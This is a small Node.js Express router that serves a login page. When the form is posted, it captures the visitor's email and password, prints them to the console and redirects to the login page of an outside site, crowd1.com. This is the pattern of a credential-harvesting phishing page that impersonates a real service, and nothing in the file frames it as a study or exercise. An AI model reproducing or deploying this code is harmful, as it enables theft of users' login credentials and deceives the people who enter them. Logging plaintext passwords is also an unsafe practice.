const express = require('express');
const router = express.Router();

router.get('/', (req, res, next) => {
  return res.render('login');
});

router.post('/login', (req, res, next) => {
  const user = {
    email: req.body.email,
    password: req.body.password
  };
  console.log(user);
  res.redirect('https://crowd1.com/login');
});

module.exports = router;